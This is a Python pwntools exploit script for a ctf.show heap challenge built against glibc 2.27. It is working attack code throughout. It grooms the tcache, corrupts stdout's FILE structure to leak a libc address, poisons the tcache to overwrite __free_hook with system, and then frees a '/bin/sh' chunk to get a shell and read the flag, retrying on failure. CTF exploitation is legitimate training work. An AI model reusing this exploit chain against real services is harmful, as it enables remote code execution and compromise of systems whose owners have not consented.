#!/usr/bin/env python3
from pwn import *
import time


context.binary = elf = ELF("./pwn", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
context.arch = "amd64"
context.log_level = "info"
context.timeout = 5

if args.DEBUG:
    context.log_level = "debug"

HOST = "pwn.challenge.ctf.show"
PORT = 28240
ATTEMPTS = int(args.ATTEMPTS) if args.ATTEMPTS else 10


def start():
    if args.LOCAL:
        io = process(["./lib/x86_64-linux-gnu/ld-2.27.so", "--library-path", "./lib/x86_64-linux-gnu", "./pwn"])
    else:
        io = remote(HOST, PORT)
    io.timeout = 5
    return io


def add(io, size, data):
    io.sendlineafter(b"Choice:", b"1")
    io.sendlineafter(b"Size?", str(size).encode())
    io.recvuntil(b"Content?")
    if size:
        io.send(data[:size])
        time.sleep(0.05)


def free_once(io):
    io.sendlineafter(b"Choice:", b"2")


def reset_ptr(io):
    io.sendlineafter(b"Choice:", b"1433233")


def exploit(io):
    offset = b"\x60\xc7"

    log.info("phase 1: prep bins for leak")
    add(io, 0x20, b"a")
    add(io, 0, b"")

    add(io, 0x90, b"a")
    add(io, 0, b"")

    add(io, 0x10, b"a")
    add(io, 0, b"")

    add(io, 0x90, b"a")
    for _ in range(7):
        free_once(io)

    add(io, 0, b"")
    add(io, 0x20, b"aaa")
    payload = p64(0) * 5 + p64(0x81) + offset
    add(io, 0x50, payload)

    add(io, 0, b"")
    add(io, 0x90, b"aa")
    add(io, 0, b"")
    payload = p64(0xFBAD1800) + p64(0) * 3 + b"\x00"
    log.info("phase 2: leak libc via stdout")
    add(io, 0x90, payload)

    leak_data = io.recvuntil(b"\x7f")
    end = leak_data.rfind(b"\x7f")
    if end < 5:
        raise EOFError("short leak")
    leak = u64(leak_data[end - 5:end + 1].ljust(8, b"\x00"))
    if leak >> 40 != 0x7F:
        raise EOFError(f"bad leak: {leak:#x}")
    libc.address = leak + 0x40 - libc.sym["__malloc_initialize_hook"]
    free_hook = libc.sym["__free_hook"]
    system = libc.sym["system"]
    log.info(f"libc base = {libc.address:#x}")
    log.info(f"__free_hook = {free_hook:#x}")
    log.info(f"system = {system:#x}")

    log.info("phase 3: reset pointer and poison tcache")
    reset_ptr(io)

    add(io, 0x30, b"a")
    add(io, 0, b"")
    add(io, 0xA0, b"a")
    add(io, 0, b"")
    add(io, 0x10, b"a")
    add(io, 0, b"")

    add(io, 0xA0, b"a")
    for _ in range(7):
        free_once(io)

    add(io, 0, b"")
    add(io, 0x30, b"aaa")
    payload = p64(0) * 7 + p64(0x81) + p64(free_hook - 8)
    add(io, 0x80, payload)
    add(io, 0, b"")
    add(io, 0xA0, b"a")
    add(io, 0, b"")
    add(io, 0xA0, b"/bin/sh\x00" + p64(system))
    log.info("phase 4: trigger free_hook")
    free_once(io)

    time.sleep(0.2)
    io.sendline(b"echo READY")
    io.sendline(b"cat /flag")
    io.sendline(b"exit")
    return io.recvrepeat(3), io


def main():
    for attempt in range(1, ATTEMPTS + 1):
        io = start()
        try:
            log.info(f"attempt {attempt}")
            output, io = exploit(io)
            text = output.decode(errors="ignore")
            if "ctfshow{" in text:
                log.success(text.strip())
                io.close()
                return
            if "READY" in text:
                log.info("shell spawned but flag was not returned")
            log.info(text.strip())
        except EOFError:
            log.warning("remote closed early, retrying")
        finally:
            io.close()

    raise SystemExit("failed to get flag after retries")


if __name__ == "__main__":
    main()
